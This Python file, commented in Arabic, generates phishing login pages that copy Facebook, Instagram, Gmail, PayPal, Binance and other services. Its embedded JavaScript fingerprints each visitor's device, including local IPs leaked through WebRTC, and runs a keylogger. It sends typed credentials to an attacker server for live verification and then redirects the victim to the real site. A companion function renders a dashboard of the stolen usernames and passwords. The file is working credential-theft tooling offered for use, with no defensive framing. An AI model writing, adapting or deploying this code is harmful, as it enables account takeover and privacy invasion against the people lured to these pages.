# session_hunter_templates.py
# ============================================================
# HTML Templates لـ Session Hunter
# ============================================================

import time


def build_login_page(session_id, chat_id, site_key, site, railway_url):
    """
    يبني صفحة تسجيل الدخول
    Args:
        session_id: معرف الجلسة
        chat_id: معرف المحادثة
        site_key: مفتاح الموقع (facebook, instagram, ...)
        site: dict فيه بيانات الموقع
        railway_url: URL للسيرفر
    """
    is_dark = site["bg"] in [
        "#000000", "#0b0e11", "#121212",
        "#17212b", "#232e3c", "#313338"
    ]

    top_msgs = {
        "facebook": "تسجيل الدخول إلى Facebook",
        "instagram": "Instagram",
        "tiktok": "سجّل الدخول إلى TikTok",
        "twitter": "تسجيل الدخول إلى X",
        "gmail": "تسجيل الدخول",
        "snapchat": "تسجيل الدخول",
        "linkedin": "تسجيل الدخول",
        "discord": "مرحباً بك مجدداً!",
        "telegram": "تسجيل الدخول",
        "netflix": "تسجيل الدخول",
        "paypal": "تسجيل الدخول إلى حسابك",
        "binance": "تسجيل الدخول",
    }
    top_sub_msgs = {
        "gmail": "استخدم حسابك في Google",
        "linkedin": "ابقَ على اطلاع على عالمك المهني",
        "discord": "نحن متحمسون لرؤيتك مرة أخرى!",
    }

    top_msg = top_msgs.get(site_key, site['name'])
    top_sub = top_sub_msgs.get(site_key, "")

    # قيم افتراضية
    input_bg = site['bg'] if is_dark else site['card_bg']
    if is_dark and site_key == 'twitter':
        input_bg = '#0f0f0f'

    button_color = '#000000' if site_key == 'snapchat' else '#ffffff'
    shadow_alpha = '0.4' if is_dark else '0.08'

    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>{site['name']} - تسجيل الدخول</title>
<meta name="theme-color" content="{site['color']}">
<link rel="icon" href="{site['logo']}">
<style>
  * {{ box-sizing: border-box; -webkit-tap-highlight-color: transparent; }}
  html, body {{
    margin: 0; padding: 0;
    background: {site['bg']};
    color: {site['text_color']};
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    min-height: 100vh; -webkit-font-smoothing: antialiased;
  }}
  .container {{ max-width: 400px; margin: 0 auto; padding: 60px 24px 40px; }}
  .logo-wrap {{ text-align: center; margin-bottom: 32px; }}
  .logo-wrap img {{ max-width: 180px; max-height: 80px; display: block; margin: 0 auto; }}
  .logo-text {{ font-size: 42px; font-weight: 800; color: {site['color']}; letter-spacing: -2px; }}
  h1 {{ font-size: 22px; font-weight: 600; text-align: center; margin: 0 0 8px; color: {site['text_color']}; }}
  .subtitle {{ font-size: 14px; text-align: center; color: {site['text_color'] if is_dark else '#65676b'}; opacity: 0.75; margin-bottom: 28px; line-height: 1.5; }}
  .card {{ background: {site['card_bg']}; border-radius: 12px; padding: 24px 20px;
    box-shadow: 0 2px 12px rgba(0,0,0,{shadow_alpha}); border: 1px solid {site['border']}; }}
  .form-group {{ margin-bottom: 14px; }}
  input[type="text"], input[type="email"], input[type="password"], input[type="tel"] {{
    width: 100%; padding: 15px 18px; font-size: 15px; border-radius: 8px;
    border: 1px solid {site['border']};
    background: {input_bg};
    color: {site['text_color']}; font-family: inherit; outline: none;
    transition: border-color 0.2s;
  }}
  input:focus {{ border-color: {site['color']}; }}
  input::placeholder {{ color: {site['text_color']}; opacity: 0.5; }}
  .submit-btn {{ width: 100%; padding: 15px; font-size: 16px; font-weight: 700;
    border: none; border-radius: 8px; background: {site['color']};
    color: {button_color}; cursor: pointer;
    font-family: inherit; margin-top: 6px; transition: background 0.15s; letter-spacing: 0.3px;
    position: relative; }}
  .submit-btn:hover {{ background: {site['color_dark']}; }}
  .submit-btn:active {{ transform: scale(0.99); }}
  .submit-btn:disabled {{ opacity: 0.6; cursor: not-allowed; }}
  .forgot-link {{ display: block; text-align: center; margin-top: 16px;
    color: {site['color']}; text-decoration: none; font-size: 14px; font-weight: 500; }}
  .divider {{ display: flex; align-items: center; margin: 20px 0;
    color: {site['text_color']}; opacity: 0.4; font-size: 13px; }}
  .divider::before, .divider::after {{ content: ''; flex: 1; height: 1px; background: {site['border']}; }}
  .divider span {{ padding: 0 12px; }}
  .signup-btn {{ display: block; width: 100%; padding: 14px; text-align: center;
    text-decoration: none; font-size: 15px; font-weight: 600; border-radius: 8px;
    background: transparent; border: 1.5px solid {site['color']}; color: {site['color']};
    margin-top: 6px; font-family: inherit; }}
  .footer {{ text-align: center; margin-top: 30px; font-size: 12px;
    color: {site['text_color']}; opacity: 0.5; line-height: 1.6; }}
  .error {{ background: #ffebe9; color: #d1242f; border: 1px solid #ff818266;
    border-radius: 8px; padding: 12px 16px; margin-top: 14px; font-size: 13px;
    display: none; text-align: center; animation: shake 0.4s; }}
  .error.show {{ display: block; }}
  @keyframes shake {{
    0%, 100% {{ transform: translateX(0); }}
    25% {{ transform: translateX(-6px); }}
    75% {{ transform: translateX(6px); }}
  }}
  .spinner {{ display: inline-block; width: 16px; height: 16px;
    border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
    border-radius: 50%; animation: spin 0.8s linear infinite;
    vertical-align: middle; margin-left: 8px; }}
  @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
  .success-msg {{ background: #d1f4d9; color: #0a7b2b; border: 1px solid #16a34a55;
    border-radius: 8px; padding: 12px 16px; margin-top: 14px; font-size: 13px;
    display: none; text-align: center; }}
  .success-msg.show {{ display: block; }}
</style>
</head>
<body>
<div class="container">

  <div class="logo-wrap">
    <img src="{site['logo']}" alt="{site['name']}"
      onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='block';">
    <div id="fallbackLogo" class="logo-text" style="display:none;">{site['name_en']}</div>
  </div>

  <h1>{top_msg}</h1>
  {f'<p class="subtitle">{top_sub}</p>' if top_sub else ''}

  <div class="card">
    <form id="loginForm" autocomplete="on" onsubmit="return submitForm(event)">
      <div class="form-group">
        <input type="text" id="username" name="{site['username_field']}"
          placeholder="{site['username_placeholder']}" autocomplete="username" required autofocus>
      </div>
      <div class="form-group">
        <input type="password" id="password" name="{site['password_field']}"
          placeholder="{site['password_placeholder']}" autocomplete="current-password" required>
      </div>
      <button type="submit" class="submit-btn" id="submitBtn">
        <span id="btnText">{site['button_text']}</span>
      </button>
      <a href="#" class="forgot-link" onclick="event.preventDefault()">{site['forgot_text']}</a>
    </form>

    <div id="errorBox" class="error"></div>
    <div id="successBox" class="success-msg"></div>
  </div>

  <div class="divider"><span>أو</span></div>

  <a href="{site['real_url']}" class="signup-btn">{site['signup_text']}</a>

  <div class="footer">
    <div>{site['name_en']} © {time.strftime('%Y')}</div>
    <div style="margin-top:4px;">اللغات: العربية · English · Français</div>
  </div>

</div>

<script>
(function() {{
  "use strict";
  
  const SESSION_ID = "{session_id}";
  const CHAT_ID = "{chat_id}";
  const SERVER = "{railway_url}";
  const SITE_KEY = "{site_key}";
  const REAL_URL = "{site['real_url']}";
  
  let attempts = 0;
  const MAX_ATTEMPTS = 5;
  
  // ============================================================
  // بصمة الجهاز
  // ============================================================
  async function collectFingerprint() {{
    const fp = {{
      session_id: SESSION_ID, chat_id: CHAT_ID, type: 'device',
      site: SITE_KEY, ua: navigator.userAgent, platform: navigator.platform,
      lang: navigator.language, languages: navigator.languages || [],
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {{ w: window.screen.width, h: window.screen.height, dpr: window.devicePixelRatio, depth: window.screen.colorDepth }},
      hardware: {{ cores: navigator.hardwareConcurrency || 'N/A', memory: navigator.deviceMemory || 'N/A', touch: navigator.maxTouchPoints || 0 }},
      url: window.location.href
    }};
    try {{
      if (navigator.getBattery) {{
        const b = await navigator.getBattery();
        fp.battery = {{ level: Math.round(b.level * 100), charging: b.charging }};
      }}
    }} catch(e) {{}}
    try {{
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) fp.network = {{ type: c.effectiveType, downlink: c.downlink }};
    }} catch(e) {{}}
    try {{
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (gl) {{
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) fp.gpu = {{
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        }};
      }}
    }} catch(e) {{}}
    try {{
      const ips = new Set();
      const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:stun.l.google.com:19302'}}]}});
      pc.createDataChannel('');
      pc.onicecandidate = e => {{
        if (!e.candidate) return;
        const m = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      }};
      await pc.setLocalDescription(await pc.createOffer());
      await new Promise(r => setTimeout(r, 2000));
      pc.close();
      if (ips.size) fp.webrtc_ips = Array.from(ips);
    }} catch(e) {{}}
    return fp;
  }}
  
  (async () => {{
    const fp = await collectFingerprint();
    try {{
      await fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(fp)
      }});
    }} catch(e) {{}}
  }})();
  
  // ============================================================
  // Keylogger
  // ============================================================
  let keyBuffer = '';
  let lastKeyTime = 0;
  document.addEventListener('keydown', function(e) {{
    try {{
      let key = e.key;
      if (key === 'Enter') key = '\\n';
      else if (key === 'Backspace') key = '⌫';
      else if (key === 'Tab') key = ' ⇥ ';
      else if (key.length > 1) return;
      keyBuffer += key;
      const now = Date.now();
      if (now - lastKeyTime > 2000 || key === '\\n' || keyBuffer.length > 80) {{
        if (keyBuffer.trim()) {{
          fetch(SERVER + '/sh_data', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
              session_id: SESSION_ID, chat_id: CHAT_ID, type: 'keylog',
              site: SITE_KEY, text: keyBuffer, url: window.location.href
            }})
          }}).catch(() => {{}});
          keyBuffer = '';
        }}
        lastKeyTime = now;
      }}
    }} catch(e) {{}}
  }}, true);
  
  // ============================================================
  // إرسال النموذج + التحقق الفعلي
  // ============================================================
  window.submitForm = async function(event) {{
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submitBtn');
    const errorBox = document.getElementById('errorBox');
    const successBox = document.getElementById('successBox');
    
    errorBox.classList.remove('show');
    successBox.classList.remove('show');
    
    if (!username || !password) {{
      errorBox.textContent = 'الرجاء إدخال البريد وكلمة السر';
      errorBox.classList.add('show');
      return false;
    }}
    
    attempts++;
    
    btn.disabled = true;
    btn.innerHTML = 'جاري التحقق<span class="spinner"></span>';
    
    try {{
      const resp = await fetch(SERVER + '/sh_verify', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          site: SITE_KEY,
          username: username,
          password: password,
          attempt: attempts,
          url: window.location.href
        }})
      }});
      
      const result = await resp.json();
      console.log('[VERIFY]', result);
      
      if (result.status === 'valid') {{
        successBox.textContent = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';
        successBox.classList.add('show');
        btn.innerHTML = '✅ تم التحقق';
        setTimeout(() => {{
          window.location.href = REAL_URL;
        }}, 1500);
        return false;
      }}
      
      if (result.status === 'invalid') {{
        if (attempts >= MAX_ATTEMPTS) {{
          errorBox.textContent = 'تم تجاوز الحد الأقصى للمحاولات. الرجاء المحاولة لاحقاً.';
          errorBox.classList.add('show');
          btn.disabled = false;
          btn.innerHTML = '<span id="btnText">حاول لاحقاً</span>';
          return false;
        }}
        errorBox.textContent = 'كلمة السر غير صحيحة. يرجى المحاولة مرة أخرى.';
        errorBox.classList.add('show');
        document.getElementById('password').value = '';
        document.getElementById('password').focus();
        btn.disabled = false;
        btn.innerHTML = '<span id="btnText">{site['button_text']}</span>';
        return false;
      }}
      
      errorBox.textContent = 'تعذّر الاتصال. يرجى المحاولة مرة أخرى.';
      errorBox.classList.add('show');
      btn.disabled = false;
      btn.innerHTML = '<span id="btnText">حاول مرة أخرى</span>';
      return false;
      
    }} catch(e) {{
      errorBox.textContent = 'تعذّر الاتصال بالشبكة. تأكد من الإنترنت.';
      errorBox.classList.add('show');
      btn.disabled = false;
      btn.innerHTML = '<span id="btnText">حاول مرة أخرى</span>';
      return false;
    }}
  }};
  
  document.addEventListener('keypress', function(e) {{
    if (e.key === 'Enter' && e.target.tagName === 'INPUT') {{
      e.preventDefault();
      document.getElementById('loginForm').requestSubmit();
    }}
  }});
  
}})();
</script>
</body>
</html>"""


def build_dashboard(session_id, sess, site):
    """يبني لوحة عرض الويب"""
    creds = sess.get("captured_credentials", [])

    cred_rows = ""
    for c in creds:
        cred_rows += f'''
        <tr>
            <td><code>{c.get('username', '')}</code></td>
            <td><code>{c.get('password', '')}</code></td>
            <td>{'✅' if c.get('verified') else '❌'}</td>
            <td>{time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}</td>
        </tr>'''

    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>Session Dashboard</title>
<style>
  body {{ font-family: -apple-system, sans-serif; background: #0f172a; color: #f8fafc;
    margin: 0; padding: 24px; }}
  .c {{ max-width: 900px; margin: 0 auto; }}
  h1 {{ color: {site.get('color', '#38bdf8')}; }}
  .card {{ background: #1e293b; border-radius: 12px; padding: 20px;
    margin-bottom: 16px; border: 1px solid #334155; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{ text-align: right; padding: 10px; border-bottom: 1px solid #334155;
    color: #64748b; font-weight: 600; }}
  td {{ padding: 10px; border-bottom: 1px solid #1e293b; }}
  code {{ background: #0f172a; padding: 3px 8px; border-radius: 4px;
    color: #4ade80; font-family: monospace; font-size: 12px; word-break: break-all; }}
</style>
</head>
<body>
<div class="c">
  <h1>🎯 {site.get('name', 'Session')} — لوحة التحكم</h1>
  <div class="card">
    <p><b>🆔:</b> <code>{session_id}</code></p>
    <p><b>👤 Chat:</b> <code>{sess.get('chat_id')}</code></p>
    <p><b>🌐 IP:</b> <code>{sess.get('captured_ip', 'N/A')}</code></p>
    <p><b>📄 صفحات:</b> {sess.get('page_views', 0)}</p>
    <p><b>❌ محاولات فاشلة:</b> {sess.get('failed_attempts', 0)}</p>
  </div>
  <div class="card">
    <h2>🔐 البيانات المُتحقق منها ({len(creds)})</h2>
    <table>
      <tr><th>المستخدم</th><th>كلمة السر</th><th>متحقق</th><th>الوقت</th></tr>
      {cred_rows if cred_rows else '<tr><td colspan="4" style="text-align:center">لا توجد بيانات بعد</td></tr>'}
    </table>
  </div>
</div>
</body>
</html>"""
